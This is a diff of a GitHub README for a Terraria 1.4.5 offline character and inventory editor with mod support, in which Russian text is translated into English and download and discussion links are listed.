@@ -1,15 +1,15 @@
 <div align="center">
 
-# Terraria Character Editor 1.4.5+ | Calamity & Thorium Full Support  
-**UPD: 15.03.2026**
+# Terraria Character Editor 1.4.5+ | Full Calamity & Thorium Support  
+**Updated: March 15, 2026**
 
 <p>
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/download/1.0/Terraria.Inventory.Editor.2026.03.10.zip">
-    <img src="https://img.shields.io/badge/СКАЧАТЬ%20v1.0-Готово!-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download v1.0">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20v1.0-Ready!-22c55e?style=for-the-badge&logo=windows&logoColor=white&labelColor=14532d" alt="Download v1.0">
   </a>
   &nbsp;&nbsp;
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/latest">
-    <img src="https://img.shields.io/badge/Все%20релизы-181717?style=for-the-badge&logo=github&logoColor=white" alt="All Releases">
+    <img src="https://img.shields.io/badge/All%20Releases-181717?style=for-the-badge&logo=github&logoColor=white" alt="All Releases">
   </a>
 </p>
 
@@ -20,53 +20,53 @@
   <img src="https://img.shields.io/github/license/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium?style=flat-square&color=blue&logo=github" alt="MIT License">
 </p>
 
-<em>Windows ZIP • Распакуй и запусти .exe • Обязательно сделай бэкап .plr / .plrx перед редактированием!</em>
+<em>Windows ZIP • Extract and run .exe • Always backup your .plr / .plrx files before editing!</em>
 
 <br>
 
-**Мощный автономный редактор персонажей для Terraria 1.4.5 "Bigger & Boulder"**  
-Редактируй инвентарь, спавнь модовые предметы, разблокируй всё оффлайн — полная поддержка Calamity, Thorium, Fargo's и других модов.
+**Powerful standalone .plr / .plrx editor for Terraria 1.4.5 "Bigger & Boulder"**  
+Edit inventory, spawn modded items, unlock everything offline — full support for Calamity, Thorium, Fargo's Souls, and more.
 
 </div>
 
 <p align="center">
-  <img width="80%" src="https://github.com/user-attachments/assets/18c7c2b4-5800-4e79-93dd-61e91f03ad98" alt="Главный интерфейс редактора — инвентарь и исследования Journey">
+  <img width="80%" src="https://github.com/user-attachments/assets/18c7c2b4-5800-4e79-93dd-61e91f03ad98" alt="Main Editor Interface - Inventory & Journey Research">
   <br><br>
-  <em>Тёмная ImGui тема • Drag-and-drop • Живое превью персонажа • Поддержка модов</em>
+  <em>Dark ImGui UI • Drag-and-drop • Live character preview • Mod support</em>
 </p>
 
 <p align="center">
-  <img width="45%" src="https://user-images.githubusercontent.com/40578274/89720219-8a057c00-d9d8-11ea-98a1-46c151295583.png" alt="Пример тёмной темы ImGui">
-  <img width="45%" src="https://forums.terraria.org/index.php?attachments/20230227010840_1-jpg.400381/" alt="Вдохновение от модового интерфейса Terraria">
+  <img width="45%" src="https://user-images.githubusercontent.com/40578274/89720219-8a057c00-d9d8-11ea-98a1-46c151295583.png" alt="ImGui Dark Theme Example">
+  <img width="45%" src="https://forums.terraria.org/index.php?attachments/20230227010840_1-jpg.400381/" alt="Terraria Modded UI Inspiration">
   <br><br>
-  <em>Док-панели • Компактный режим • Браузер предметов с фильтрами</em>
+  <em>Dockable windows • Compact mode • Item browser with filters</em>
 </p>
 
 <p align="center">
-  <img width="60%" src="https://cybrancee.com/learn/wp-content/uploads/2025/10/CybranceeTerrariaCustomizingMenuOutlined.png" alt="Превью создания персонажа">
+  <img width="60%" src="https://cybrancee.com/learn/wp-content/uploads/2025/10/CybranceeTerrariaCustomizingMenuOutlined.png" alt="Terraria Character Creation Preview">
   <br><br>
-  <em>Полная поддержка создателя персонажа • Волосы, кожа, трансформации в реальном времени</em>
+  <em>Full character creator support • Hair, skin, transformations preview</em>
 </p>
 
 <div align="center">
 
-### 📥 Где скачать и обсудить
+### 📥 Download & Discuss
 
 <p>
   <a href="https://github.com/Skezz231/Terraria-Character-Editor-1.4.5-Calamity-Thorium/releases/latest">
-    <img src="https://img.shields.io/badge/GitHub_Releases-Последняя_версия-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Releases">
+    <img src="https://img.shields.io/badge/GitHub_Releases-Latest_Version-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Releases">
   </a>
   <a href="https://www.unknowncheats.me/forum/other-games/743004-terraria-character-editor-1-4-5-a.html">
-    <img src="https://img.shields.io/badge/UnknownCheats-Обсуждение-8A2BE2?style=for-the-badge&logo=discourse&logoColor=white" alt="UnknownCheats">
+    <img src="https://img.shields.io/badge/UnknownCheats-Discussion-8A2BE2?style=for-the-badge&logo=discourse&logoColor=white" alt="UnknownCheats">
   </a>
   <a href="https://www.nexusmods.com/terraria/mods/167?tab=files">
-    <img src="https://img.shields.io/badge/Nexus_Mods-Загрузка-E74C3C?style=for-the-badge&logoColor=white" alt="Nexus Mods">
+    <img src="https://img.shields.io/badge/Nexus_Mods-Download-E74C3C?style=for-the-badge&logoColor=white" alt="Nexus Mods">
   </a>
   <a href="https://vgtimes.com/games/terraria/files/92830-terraria-character-editor-mod-support-1.4.5.html">
-    <img src="https://img.shields.io/badge/VGtimes_RU-Загрузка_(RU)-3498DB?style=for-the-badge&logoColor=white" alt="VGtimes RU">
+    <img src="https://img.shields.io/badge/VGtimes_RU-Download_(RU)-3498DB?style=for-the-badge&logoColor=white" alt="VGtimes RU">
   </a>
   <a href="https://vgtimes.ru/games/terraria/files/92830-terraria-character-editor-mod-sup-1-4-5.html">
-    <img src="https://img.shields.io/badge/VGtimes_RU_Alt-Альтернатива-2980B9?style=for-the-badge&logoColor=white" alt="VGtimes RU alt">
+    <img src="https://img.shields.io/badge/VGtimes_RU_Alt-Alternative-2980B9?style=for-the-badge&logoColor=white" alt="VGtimes RU alt">
   </a>
 </p>
 
@@ -75,9 +75,8 @@
 <hr>
 
 <div align="center">
-  <sub>Сделано с ❤️ для Terraria-сообщества • MIT License • v1.0 — март 2026</sub>
+  <sub>Made with ❤️ for the Terraria community • MIT License • v1.0 — March 2026</sub>
 </div>
-
 
 ## Why Choose This Terraria Inventory Editor in 2026?
 
